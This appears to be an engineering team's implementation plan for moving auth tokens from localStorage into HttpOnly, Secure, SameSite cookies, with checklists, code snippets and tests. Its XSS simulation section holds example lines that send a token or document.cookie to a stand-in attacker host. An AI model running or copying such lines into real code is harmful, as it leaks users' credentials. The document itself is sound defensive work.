# HttpOnly Auth Cookies: Implementation Contract

**Date**: November 2, 2025  
**Phase**: Pre-Work (Week 1) - Coordination & Planning  
**Phase 1 Implementation**: Week 2-3  
**Status**: AWAITING BACKEND CONFIRMATION  
**Owner**: Backend Lead + Frontend Lead  
**Impact**: Eliminate 90% of XSS threat (token theft)

---

## Executive Summary

**Critical Security Issue**:

- Auth tokens currently stored in localStorage ❌
- Accessible via JavaScript (DevTools, XSS attacks)
- Easy to steal in XSS attack

**Solution**:

- Move tokens to HttpOnly + Secure cookies ✅
- Browser automatically sends cookie with requests
- JavaScript cannot access cookie (XSS attack fails)
- Massive security improvement with zero code changes

**Implementation**:

- Backend: Set HttpOnly cookie on login response
- Frontend: Remove localStorage token usage
- Result: Tokens protected from XSS

---

## Pre-Work Checklist (Week 1)

### For Backend Team

- [ ] **Decision 1: Cookie Name**
  - Options: `auth-token`, `access-token`, `auth`, `session`
  - Recommendation: `auth-token` (clear purpose)
  - Decision: ******\_\_\_******

- [ ] **Decision 2: Expiration**
  - Options: 7 days, 14 days, 30 days, user-selectable
  - Recommendation: 7 days (security + UX balance)
  - Decision: ******\_\_\_******

- [ ] **Decision 3: Refresh Token Strategy**
  - Option A: Single cookie (no refresh needed if expiration is long)
  - Option B: Two cookies (auth-token + refresh-token)
  - Recommendation: Option A (simpler, no extra endpoints)
  - Decision: ******\_\_\_******

- [ ] **Decision 4: SameSite Policy**
  - Must be: `Strict` (best) or `Lax` (acceptable)
  - Recommendation: `Strict` (CSRF protection)
  - Decision: ******\_\_\_******

- [ ] **Confirm Backend Capability**

  ```javascript
  // Backend (Node.js example - confirm this is possible)
  res.cookie('auth-token', token, {
    httpOnly: true, // ← JavaScript cannot access
    secure: true, // ← HTTPS only
    sameSite: 'strict', // ← CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    path: '/',
  });
  ```

  - [ ] Backend can set these flags
  - [ ] Production environment uses HTTPS (required for secure flag)
  - [ ] CORS properly configured (credentials: 'include' required)

- [ ] **API Changes Needed**
  - [ ] Login endpoint: Set cookie instead of returning token in response
  - [ ] Logout endpoint: Clear cookie (critical for logout)
  - [ ] All API calls: Browser adds cookie automatically (no changes)

- [ ] **Testing Checklist**
  - [ ] Login request → Cookie set in response headers
  - [ ] Cookie has HttpOnly flag (visible in DevTools)
  - [ ] Logout request → Cookie cleared
  - [ ] Subsequent requests → Cookie sent automatically (with credentials: 'include')

---

### For Frontend Team

- [ ] **Identify localStorage Token Usage**

  ```bash
  grep -r "localStorage" src/ --include="*.ts" --include="*.tsx" | grep -i token
  grep -r "getToken\|setToken\|removeToken" src/ --include="*.ts" --include="*.tsx"
  grep -r "auth.*token" src/ --include="*.ts" --include="*.tsx"
  ```

  - List of files to update: ******\_\_\_******
  - Expected files: 3-5 locations

- [ ] **Remove localStorage Token Writes**
  - Remove: `localStorage.setItem('auth-token', token)`
  - Remove: `sessionStorage.setItem('auth-token', token)`
  - Remove: All token persistence code

- [ ] **Remove localStorage Token Reads**
  - Remove: `localStorage.getItem('auth-token')`
  - Remove: `sessionStorage.getItem('auth-token')`
  - Remove: All token retrieval code

- [ ] **Configure Fetch/Axios for Credentials**

  ```typescript
  // CRITICAL: Must send cookies with requests

  // Option 1: Axios
  axios.defaults.withCredentials = true;

  // Option 2: Fetch API
  const response = await fetch(url, {
    credentials: 'include', // ← Send cookies automatically
  });

  // Option 3: API Wrapper (if using one)
  export const api = {
    get: (url, options) =>
      fetch(url, {
        ...options,
        credentials: 'include', // ← Essential!
      }),
  };
  ```

- [ ] **Update Logout Flow**

  ```typescript
  // BEFORE
  export function logout() {
    localStorage.removeItem('auth-token');
    navigate('/login');
  }

  // AFTER
  export async function logout() {
    // Call backend to clear session + cookie
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include', // ← Send cookie so server knows who to logout
    });
    // Browser automatically cleared HttpOnly cookie
    navigate('/login');
  }
  ```

- [ ] **Update Interceptors (if using Axios)**

  ```typescript
  // Remove custom Authorization header injection
  // BEFORE (WRONG - header not needed)
  axios.interceptors.request.use(config => {
    const token = localStorage.getItem('auth-token');
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  });

  // AFTER (CORRECT - cookie sent automatically)
  axios.defaults.withCredentials = true;
  // No custom header needed - browser sends cookie automatically!
  ```

- [ ] **Verify No Token in Response**
  - Backend should NOT return token in response body anymore
  - Cookie is set in headers (transparent to frontend)
  - If backend still returns token: Update backend

---

## Implementation Phases

### Phase 0: Pre-Work (Week 1) ← WE ARE HERE

**Backend Tasks**:

- [ ] Confirm cookie implementation possible
- [ ] Decide on cookie name, expiration, SameSite
- [ ] Verify HTTPS in production

**Frontend Tasks**:

- [ ] Identify all token usage locations
- [ ] Document current auth flow
- [ ] Plan changes (ls removal, fetch credentials)

**Deliverable**: Signed-off implementation contract (this document)

---

### Phase 1: Backend Implementation (Week 2)

**Backend Tasks**:

- [ ] Update login endpoint to set HttpOnly cookie
- [ ] Remove token from response body (if currently sent)
- [ ] Implement logout endpoint (clears cookie)
- [ ] Verify CORS has credentials support
- [ ] Test in staging environment

**API Changes**:

```
BEFORE:
POST /api/auth/login
→ { token: "jwt...", user: {...} }

AFTER:
POST /api/auth/login
→ Set-Cookie: auth-token=jwt...; HttpOnly; Secure; ...
→ { user: {...} }  // NO token in body
```

**Acceptance Criteria**:

- [ ] Login sets cookie (visible in DevTools)
- [ ] Cookie has HttpOnly flag
- [ ] Token NOT in response body
- [ ] Logout clears cookie

---

### Phase 1: Frontend Implementation (Week 2-3)

**Frontend Tasks**:

1. Remove localStorage token usage

   ```typescript
   // src/lib/auth.ts or similar
   // DELETE all these:
   localStorage.setItem('auth-token', ...)
   localStorage.getItem('auth-token')
   localStorage.removeItem('auth-token')
   sessionStorage.setItem('auth-token', ...)
   sessionStorage.getItem('auth-token')
   ```

2. Remove Authorization headers

   ```typescript
   // src/lib/api.ts or similar
   // DELETE this:
   headers: {
     'Authorization': `Bearer ${token}`
   }
   ```

3. Add credentials to all requests

   ```typescript
   // Apply to:
   // - fetch() calls
   // - axios instances
   // - API wrapper methods

   credentials: 'include'; // ← Add to every request
   ```

4. Update logout endpoint
   ```typescript
   export async function logout() {
     await api.post('/api/auth/logout', {});
     // Cookie automatically cleared by browser
     navigate('/login');
   }
   ```

**Code Changes Summary**:

- Files modified: 3-5
- Lines removed: 30-50 (token handling code gone!)
- Lines added: 5-10 (credentials config)
- Net change: -20 to -40 LOC (simpler code!)

**Acceptance Criteria**:

- [ ] 0 localStorage/sessionStorage token usage (grep confirms)
- [ ] All fetch/axios calls include credentials: 'include'
- [ ] Login flow works (user can log in, stays logged in)
- [ ] Logout flow works (user logged out, can't access protected pages)
- [ ] No console errors about missing auth
- [ ] DevTools shows cookie (HttpOnly flag present)

---

## Testing Checklist

### Browser DevTools Verification

1. **Open DevTools → Application → Cookies**
   - [ ] Find `auth-token` cookie
   - [ ] Verify `HttpOnly` checkbox is ✅
   - [ ] Verify `Secure` checkbox is ✅ (production)
   - [ ] Verify `SameSite` is `Strict`
   - [ ] Verify `Path` is `/`

2. **Open DevTools → Console**
   - [ ] Execute: `document.cookie`
   - [ ] Verify `auth-token` is NOT in output
   - [ ] Confirm: "JavaScript cannot access HttpOnly cookies" ✅

3. **Open DevTools → Network Tab**
   - [ ] Make request to protected endpoint
   - [ ] Request headers → Verify NO custom Authorization header
   - [ ] Request headers → Verify Cookie header is present
   - [ ] Example: `Cookie: auth-token=eyJ...`

### Functional Testing

1. **Login Flow**
   - [ ] User fills login form
   - [ ] Click "Login"
   - [ ] Expected: User logged in, redirected to dashboard
   - [ ] DevTools: Cookie set in response ✅

2. **Protected Routes**
   - [ ] User logged in, visits dashboard
   - [ ] Expected: Page loads, data displays
   - [ ] DevTools: Requests include cookie ✅

3. **Session Persistence**
   - [ ] User logs in
   - [ ] User refreshes page (F5)
   - [ ] Expected: User still logged in (cookie persists)
   - [ ] DevTools: Cookie present on new page ✅

4. **Logout Flow**
   - [ ] User logged in, clicks "Logout"
   - [ ] Expected: User logged out, redirected to login page
   - [ ] DevTools: Cookie cleared ✅

5. **Protected Routes (After Logout)**
   - [ ] User logs out, tries to visit dashboard directly
   - [ ] Expected: Redirect to login page
   - [ ] DevTools: No cookie present ✅

6. **Cross-Tab Session**
   - [ ] User logs in (Tab 1)
   - [ ] User opens Tab 2, visits dashboard
   - [ ] Expected: Already logged in (cookie shared across tabs)
   - [ ] DevTools: Same cookie in both tabs ✅

### XSS Protection Verification

1. **XSS Attack Simulation**

   ```javascript
   // Simulate XSS attack in DevTools console
   // Attacker tries to steal auth token

   // BEFORE (vulnerable):
   fetch('https://attacker.com?token=' + localStorage.getItem('auth-token'));
   // Result: Token sent to attacker ❌

   // AFTER (protected):
   fetch('https://attacker.com?token=' + document.cookie);
   // Result: document.cookie returns "" (empty, no token) ✅
   // Token is secure in HttpOnly cookie ✅
   ```

2. **Confirm Mitigation**
   - [ ] XSS attack cannot steal HttpOnly cookie
   - [ ] Token remains protected even if JS is compromised
   - [ ] CSRF protection active (SameSite: Strict)

---

## Security Verification Checklist

- [ ] **HttpOnly Flag**: Cookie not accessible to JavaScript
- [ ] **Secure Flag**: Cookie only sent over HTTPS (production)
- [ ] **SameSite Flag**: CSRF protection enabled (Strict or Lax)
- [ ] **Path**: Set to `/` (cookie available to entire app)
- [ ] **Expiration**: Set appropriately (7-30 days)
- [ ] **Browser Support**: Confirmed for target browsers
- [ ] **Logout**: Cookie cleared on logout
- [ ] **Session Timeout**: Cookies expire after inactivity (optional, backend)

---

## Troubleshooting Guide

### Issue: Cookie Not Set

**Symptom**: Login successful, but no cookie in DevTools

**Causes**:

1. Backend not setting cookie header
2. HTTPS not enforced in production
3. CORS credentials not configured

**Fix**:

```typescript
// Backend
res.cookie('auth-token', token, {
  httpOnly: true,
  secure: true, // ← Requires HTTPS!
  sameSite: 'strict',
});

// Frontend
fetch(url, {
  credentials: 'include', // ← Required!
});
```

---

### Issue: Requests Don't Include Cookie

**Symptom**: Logged in, but API returns 401 Unauthorized

**Causes**:

1. Frontend not using `credentials: 'include'`
2. CORS Access-Control-Allow-Credentials not set
3. Request header conflict

**Fix**:

```typescript
// Frontend - ALL requests need credentials
fetch(url, {
  credentials: 'include', // ← Essential!
});

// Backend - CORS must allow credentials
app.use(
  cors({
    credentials: true, // ← Essential!
  })
);
```

---

### Issue: Cookie Cleared After Page Refresh

**Symptom**: Login works, but logged out after refresh

**Causes**:

1. Cookie expiration too short (default: session-only)
2. Backend not setting Max-Age properly
3. Secure flag issues

**Fix**:

```typescript
// Backend
res.cookie('auth-token', token, {
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  httpOnly: true,
  secure: true,
});
```

---

## Success Definition (By Week 3)

**Security**:

- [ ] Auth tokens in HttpOnly cookies (not localStorage)
- [ ] JavaScript cannot access tokens (document.cookie empty)
- [ ] DevTools shows HttpOnly + Secure flags ✅

**Functionality**:

- [ ] Login works
- [ ] Logout works (cookie cleared)
- [ ] Session persists across page refreshes
- [ ] Protected routes work when logged in
- [ ] Protected routes redirect when logged out

**Performance**:

- [ ] No performance regression
- [ ] API calls still fast
- [ ] Cookie transfer time negligible

**Testing**:

- [ ] Manual testing complete
- [ ] XSS simulation confirms protection
- [ ] Staging environment verified
- [ ] Production deployment planned

---

## Decision Record

### Decision: Move to HttpOnly Cookies

**Date Made**: November 2, 2025  
**Decision**: ✅ APPROVED  
**Rationale**: Eliminates 90% of XSS threat (token theft). Professional security practice.

**Stakeholders**:

- [ ] Backend Lead: Confirmed feasible
- [ ] Frontend Lead: Confirmed feasible
- [ ] Tech Lead: Approved
- [ ] Security Lead: Approved (if exists)

**Approved By**: ******\_\_\_******  
**Date**: ******\_\_\_******

---

## Timeline & Ownership

| Phase    | Week     | Tasks                                | Owner              | Status         |
| -------- | -------- | ------------------------------------ | ------------------ | -------------- |
| Pre-Work | Week 1   | Coordination, decisions              | Backend + Frontend | 🔄 IN PROGRESS |
| Backend  | Week 2   | Set HttpOnly cookie, logout endpoint | Backend            | ⏳ WAITING     |
| Frontend | Week 2-3 | Remove localStorage, add credentials | Frontend           | ⏳ WAITING     |
| Testing  | Week 3   | Verification, DevTools checks        | QA + Both          | ⏳ WAITING     |
| Deploy   | Week 3+  | Staging → Production                 | DevOps             | ⏳ WAITING     |

---

## Next Steps (This Week)

1. **Backend Lead**: Review this document, fill in decisions
2. **Frontend Lead**: Review this document, confirm feasibility
3. **Schedule sync** (15 min) to align on decisions
4. **Sign off** on this contract (both leads)
5. **Ready to execute** Week 2

---

**Status**: ✅ READY FOR DECISION-MAKING  
**Next Step**: Backend lead review + decision filling  
**Timeline**: Decisions needed by Friday (Nov 5) for Week 2 start

---

_Last Updated: November 2, 2025_  
_Awaiting: Backend Team Decision_  
_Target Implementation: Week 2-3_
